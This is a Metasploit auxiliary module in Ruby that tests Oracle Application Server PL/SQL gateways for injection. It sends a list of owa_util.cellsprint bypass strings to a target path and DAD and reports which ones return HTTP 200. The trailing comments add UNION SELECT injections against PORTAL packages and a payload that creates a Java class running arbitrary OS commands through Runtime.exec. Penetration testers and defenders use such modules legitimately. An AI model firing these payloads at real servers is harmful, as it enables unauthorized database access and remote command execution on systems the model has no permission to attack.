##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'Oracle Application Server PL/SQL Injection Tester',
			'Version'     => '$Revision:  $',
			'Description' => 'PL/SQL injection tester. Pass path and DAD tries common injection bypasss methods. Pay careful attention to the /\'s in URIPATH and DAD',
			'Author'      => 'CG' ,
			'License'     => MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://www.owasp.org/index.php/Testing_for_Oracle' ]
				]
			)
		register_options(
			[
				OptString.new('URIPATH', [ true,  "The URI PATH", '/pls/']),
				OptString.new('DAD', [ true,  "The Database Access Descriptor", 'portal/'])
			], self.class)
	end

	def run

		checks = [		
			"owa_util.cellsprint?p_thequery=select+1+from+dual",
			"%0Aowa_util.cellsprint?p_thequery=select+1+from+dual",
			"%20owa_util.cellsprint?p_thequery=select+1+from+dual",
			"oaA_util.cellsprint?p_thequery=select+1+from+dual",
			"ow%25%34%31_util.cellsprint?p_thequery=select+1+from+dual",
			"%20owa_util.cellsprint?p_thequery=select+1+from+dual",
			"%09owa_util.cellsprint?p_thequery=select+1+from+dual",
			"S%FFS.owa_util.cellsprint?p_thequery=select+1+from+dual",
			"S%AFS.owa_util.cellsprint?p_thequery=select+1+from+dual",
			"%5CSYS.owa_util.cellsprint?p_thequery=select+1+from+dual",
			"*SYS*.owa_util.cellsprint?p_thequery=select+1+from+dual",
			"\"SYS\".owa_util.cellsprint?p_thequery=select+1+from+dual",
			"<<\"LBL\">>owa_util.cellsprint?p_thequery=select+1+from+dual",
			"<<LBL>>owa_util.cellsprint?p_thequery=select+1+from+dual",
			"<<LBL>>SYS.owa_util.cellsprint?p_thequery=select+1+from+dual",
			"<<\"LBL\">>SYS.owa_util.cellsprint?p_thequery=select+1+from+dual",
			"JAVA_AUTONOMOUS_TRANSACTION.PUSH?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
			"XMLGEN.USELOWERCASETAGNAMES?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
			"PORTAL.wwv_dynxml_generator.show?p_text=<ORACLE>SELECT+1+FROM+DUAL</ORACLE>", 
			"PORTAL.wwv_ui_lovf.show?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL", #need to test
			"PORTAL.WWV_HTP.CENTERCLOSE?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
			"ORASSO.HOME?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
			#"orasso.home?);execute+immediate+:1;---=SELECT+1+FROM+DUAL",
			"WWC_VERSION.GET_HTTP_DATABASE_INFO?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+1+FROM+DUAL",
			"CTXSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL",
				]

		path = datastore['URIPATH']
		dad = datastore['DAD']
			
		print_status("Sending requests to #{rhost}:#{rport}#{path}#{dad}\n")
			
		checks.each do | check1|
		
		begin
			res = send_request_raw({
				'uri'          => path + dad + check1, 
				'method'       => 'GET'
						}, 10)

			if (res.nil?)
				print_error("No response for #{rhost}:#{rport} #{check1}")
			elsif (res and res.code == 200)
				print_good("Received #{res.code} for #{rhost}:#{rport}#{path}#{dad}#{check1}")
			elsif(res.code == 302 or res.code == 301)
				print_status("Redirect to #{res.headers['Location']}")
			else
				print_error("Received #{res.code} for #{check1}")
				#''
			end
		end
		end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
	end
	
end

#vuln packages but couldnt get them to work, thus not in the above
#"PORTAL.wwa_app_module.link?p_arg_names=_moduleid&_p_arg_values=&p_arg_names=_sessionid&p_arg_values=&p_arg_names=empno&p_arg_values=7788'+union+select+rowid,1,object_name,object_name,1,sys date,1,1,1+from+sys.all_objects--&p_arg_names=_empno_cond&p_arg_values=%3D", #need to test..seen exmples of PORTAL30.

#"PORTAL_DEMO.ORG_CHART.SHOW?p_arg_names=_max_levels&p_arg_values=1&p_arg_names=_start_with_field&p_arg_values=EMPNO%3D=7839+union+select+object_name+from+all_objects+where+rownum=1--&p_arg_names=_start_with_value&p_arg_values=7839",

#"PORTAL_DEMO.ORG_CHART.SHOW?p_arg_names=_max_levels&p_arg_values=1&p_arg_names=_start_with_field&p_arg_values=EMPNO+union+select+object_name+from+all_objects+where+rownum=1--&p_arg_names=_start_with_value&p_arg_values=7566",

#"PORTAL.wwv_form.genpopuplist?p_fieldname=_p_attributes&p_fieldname=p_attributenames&p_fieldname=p_attributedatatypes&p_fieldname=p_attributesiteid&p_lov=SEARCHCHATTRLOV&p_element_index=0&p_formname=SEARCH54_PAGESEARCH_899010056&p_where=criteria%20==%201%20order=1&p_order=1&-_filter=%25", #need to test OAS 9

#"PORTAL.wwv_render_report.show?P_QUERY=1&P_ROW_FUNCTION=SELECT+1+FROM+DUAL", 
#Systems Affected: Oracle Application Server 9.0.4.3, 10.1.2.2, 10.1.4.1 Failed to parse as PORTAL - begin wwv_rptclip.g_row_object := SELECT 1 FROM DUAL(wwv_rptclip.g_row_object) ; end;

#"PORTAL.wwexp_api_engine.action?p_otype=FOLDER&p_octx=SITEMAP.1_6&p_datasource_data=SITEMAP&p_action=show(wwexp_datatype.g_exp_param);SELECT+1+FROM+DUAL",

#PORTAL.wwexp_api_engine.action?p_otype=FOLDER&p_octx=SITEMAP.1_6&p_datasource_data=SITEMAP&p_action=aaaaaaaaaaaaaaaa  <--needs a function there

#PORTAL.wwexp_api_engine.action?p_otype=find.get_result_type(wwexp_datatype.g_exp_param);%20execute%20immediate%20'declare%20pragma%20autonomous_transaction;%20begin%20execute%20immediate%20''CREATE%20OR%20REPLACE%20JAVA%20SOURCE%20NAMED%20SRC_EXECUTEFILE%20AS%20import%20java.lang.*;%20import%20java.io.*;public%20class%20EXECUTEFILECLASS%20{public%20static%20void%20executefile(String%20cmd)%20throws%20Exception{System.out.println(%22==========Executing%20file=======%22);Process%20p%20=%20Runtime.getRuntime().exec(cmd);}}'';%20commit;%20end;';%20end;--
